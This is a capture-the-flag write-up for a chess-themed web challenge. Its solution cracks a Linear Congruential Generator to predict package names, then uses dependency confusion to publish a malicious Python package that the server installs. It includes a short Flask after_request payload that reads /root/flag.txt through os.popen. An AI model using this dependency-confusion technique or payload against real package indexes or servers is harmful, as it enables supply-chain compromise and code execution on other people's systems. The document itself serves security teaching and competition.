# Confusing Moves
**Category:** crypto,misc

**Author:** \_Roko'sBasilisk\_

## Description

Ahh!! Chess is so confusing .... Luckily, Benny created a little website for me to submit my games and give me feedback! What a legend he is...  

Benny also left those notes for me but I don't think I need em:

```
Public PyPI username: benny
Public PyPI username: gr4ndmast3r
```
## Points
500

## Solution

<details>
 <summary>Reveal Spoiler</summary>

This challenge combines cracking a Linear Congruential Generator and applying dependency confusion on Python packages.

The steps for the solution are as follows:

1. Participants must register and try to submit anything in the PGN parser form so that they can then incpect the logs. The exposed `pip install` command, leaks the hosts of two PyPI servers and it seems that the primary one is a public one and the secondary one is a private one. Since the package is not found in the public one, it is fetched and installed from the private one. However, if the package was to be found in the public one, it would have been prioritized over the private one. This makes it vulnerable to dependency confusion. At this point participants should try to find waays of uploading the same package in the public PyPI index. (Note that credentials for publishing packages to the public one are provided in the challenges description). 

2. Still paying close attention to the logs it is apparent that the package names are randomized for every submission. Therefore, even though participants have access to publish packages in the Public PyPI index, it is necessary to predict the next package name in line to achieve dependency confusion. For that purpose, they need to inspect the source code of the parser page, in order to find some commented out notes left to Benny. In those notes the source code of the LCG is exposed which gives an insight as to how the generator works. In addition it is being referred to as "package name generator" which hints that this procedure is used for generating python package names.

3. Since now it's known that the package names are generated using a LCG, it is possible to predict the next package name by replicating the state of the LCG using the guide presented [here](https://tailcall.net/blog/cracking-randomness-lcgs/). There are also some minor changes that need to be made in order to have a reliable cracker. See the provided cracker in [solve.py](./solution/solve.py). To gather a sequence of previous states from the generator participants must submit at least 6 games and extract the generated package name from the logs. Each package name maps to an LCG state. 

4. The final part of this exploit, participants must craft a malicious python package and upload it to the public PyPI index using the next name predicted from the LCG. This should be done in incremental steps because they don't have knowledge about the inner workings of the original package. Just overriding the package for the first time will reveal an error in the logs `'pgn' module not found`. This hint indicates that the package must contain a `pgn` module. With the creation of `pgn` module participants achieve arbitrary python code execution to the server. Yet, in order to receive the response from the executed payload, we can use Flask's request decorators and just make sure that whatever the response is, we modify the output to include the result from the package's payload. A template for such python package is provided in the [package_template](./solution/package_template) folder.

For instance:
```python
import os

from flask import current_app

@current_app.after_request
def flag_printer(response):
    # we have a response to manipulate. Add flag in the response
    response.set_data(os.popen("cat /root/flag.txt").read())
    return response
```

Note that the flag path is also unknown is participants may use 2-3 more requests to find out where the flag is.

5. After crafting the maliciouspackage, it must be uploaded to the public PyPI index and at this point the next PGN game submission will reveal the results of your payload and of course the flag. 

A scripted solution that cracks the LCG, creates the package and uploads it to PyPI is provided in [solve.py](./solution.solve.py)

</details>